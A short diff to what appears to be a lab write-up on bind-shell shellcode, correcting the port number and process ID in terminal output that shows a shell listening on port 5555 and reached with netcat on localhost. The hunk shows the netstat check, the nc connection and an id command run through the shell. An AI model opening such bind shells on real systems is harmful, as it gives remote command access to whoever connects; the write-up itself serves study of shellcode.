@@ -878,9 +878,9 @@ Seperate terminal demonstrating a successful bind connection and shell on the lo
 
 ```bash
 osboxes@osboxes:~$ netstat -antp | grep 5555
-tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      1884/shell_bind_tcp_final
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      21783/shell_bind_tcp_final
 osboxes@osboxes:~$ nc -nv 127.0.0.1 5555
-Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
+Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
